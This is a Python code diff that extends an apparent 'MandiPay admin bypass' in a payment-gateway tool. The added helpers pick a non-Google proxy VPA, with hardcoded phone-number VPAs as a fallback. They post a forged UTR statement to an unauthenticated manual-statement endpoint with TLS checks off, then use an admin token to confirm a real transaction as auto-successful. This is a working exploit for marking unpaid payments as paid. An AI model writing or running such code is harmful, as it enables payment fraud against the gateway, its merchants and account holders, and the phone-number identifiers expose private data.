@@ -1131,11 +1131,18 @@ def _mandi_confirm_admin(token, user, txn_id, mid, utr, amount):
     return 0, "requests not available"
 
 def _mandi_admin_bypass(vpa, utr, amount, request_id=None):
-    """Full MandiPay admin bypass: upload statement + confirm via admin API.
-    Used when statement/manual blocks Google VPAs.
-    If request_id is provided, auto-resolves txnId from payin report."""
+    """Full MandiPay admin bypass for Google VPAs.
+    Uses proxy VPA approach: upload statement via non-Google VPA (zero auth),
+    then admin confirm with same UTR targeting the real transaction.
     
-    # Get admin token
+    Flow:
+      1. Find txn from payin report by request_id
+      2. Find a non-Google proxy VPA from account list
+      3. statement/manual with proxy VPA → creates UTR entry (NO AUTH)
+      4. admin confirm with same UTR → maps to target txn → SUCCESS_AUTO
+    """
+    
+    # Get admin token (needed for txn lookup + admin confirm)
     token, user = _mandi_get_admin_token()
     if not token:
         return 500, "Admin token acquisition failed"
@@ -1146,17 +1153,89 @@ def _mandi_admin_bypass(vpa, utr, amount, request_id=None):
         if not result:
             return 404, f"Transaction not found for requestId: {request_id}"
         txn_id, mid, txn_amount = result
-        amount = txn_amount  # Use the actual amount from the system
+        amount = txn_amount
     else:
         return 400, "request_id required for MandiPay admin bypass"
     
-    # Upload statement
-    if not _mandi_upload_statement(token, user, utr, amount):
-        return 500, "Statement upload failed"
+    # Step 1: Find a non-Google proxy VPA for statement upload
+    proxy_vpa = _mandi_find_proxy_vpa(token, user)
+    if not proxy_vpa:
+        # Fallback: try GPay CSV upload (Sep 22 method)
+        if not _mandi_upload_statement(token, user, utr, amount):
+            return 500, "No proxy VPA found and GPay CSV upload failed"
+    else:
+        # Step 2: Upload statement via proxy VPA (ZERO AUTH, no Google block)
+        if not _mandi_proxy_statement(proxy_vpa, utr, amount):
+            # Fallback: try GPay CSV upload
+            if not _mandi_upload_statement(token, user, utr, amount):
+                return 500, "Proxy statement + GPay CSV both failed"
     
-    # Confirm
+    # Step 3: Admin confirm with same UTR → targets the real txn
+    import time; time.sleep(1)  # Brief pause for statement to propagate
     code, resp = _mandi_confirm_admin(token, user, txn_id, mid, utr, amount)
     return code, resp
+
+# ─── Proxy VPA helpers ───
+
+_PROXY_VPA_CACHE = {"vpa": None, "ts": 0}
+
+def _mandi_find_proxy_vpa(token, user):
+    """Find a non-Google VPA from MandiPay account list for proxy statement upload."""
+    import time
+    # Cache for 5 minutes
+    if _PROXY_VPA_CACHE["vpa"] and time.time() - _PROXY_VPA_CACHE["ts"] < 300:
+        return _PROXY_VPA_CACHE["vpa"]
+    
+    base = GATEWAYS["mandipay"]["base"]
+    geo = _geo("super.mandipay.com")
+    google_suffixes = ["@okbizaxis", "@okhdfcbank", "@oksbi", "@okicici"]
+    
+    try:
+        r = requests.get(f"{base}/api/v1/upi/account/filter/usable?user={user}&{geo}",
+            headers={"User-Agent": "Mozilla/5.0", "Authorization": f"Bearer {token}",
+                     "client-id": user, "access-path": "SYSTEM"},
+            verify=False, timeout=10)
+        if r.status_code == 200:
+            accounts = r.json()
+            for a in accounts:
+                v = a.get("vpa", "")
+                if not v or not "@" in v:
+                    continue
+                # Skip Google Pay VPAs and gpay- prefixed
+                if v.startswith("gpay-"):
+                    continue
+                if any(v.endswith(s) for s in google_suffixes):
+                    continue
+                # Found a non-Google VPA
+                _PROXY_VPA_CACHE["vpa"] = v
+                _PROXY_VPA_CACHE["ts"] = time.time()
+                return v
+    except Exception:
+        pass
+    
+    # Hardcoded fallback — known non-Google VPAs from MandiPay
+    fallbacks = ["9664348959@mairtel", "9835831953@ybl", "9926036987@ibl"]
+    for fb in fallbacks:
+        _PROXY_VPA_CACHE["vpa"] = fb
+        _PROXY_VPA_CACHE["ts"] = time.time()
+        return fb
+    return None
+
+def _mandi_proxy_statement(proxy_vpa, utr, amount):
+    """Upload statement/manual using a non-Google proxy VPA. ZERO AUTH required."""
+    cfg = GATEWAYS["mandipay"]
+    salt = cfg.get("salt", "TEST_SALT")
+    h = hashlib.sha256(f"{proxy_vpa}{utr}{amount}{salt}".encode()).hexdigest()
+    
+    try:
+        r = requests.post(
+            f"{cfg['base']}/api/v1/upi/api/statement/manual?user=system_rpa",
+            json={"vpa": proxy_vpa, "utr": utr, "amount": float(amount), "hash": h},
+            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
+            verify=False, timeout=10)
+        return r.status_code == 200 and "successfully" in r.text.lower()
+    except Exception:
+        return False
 
 def add_log(session_token, gw, action, detail1, detail2, utr, status, msg=""):
     s = get_session(session_token)
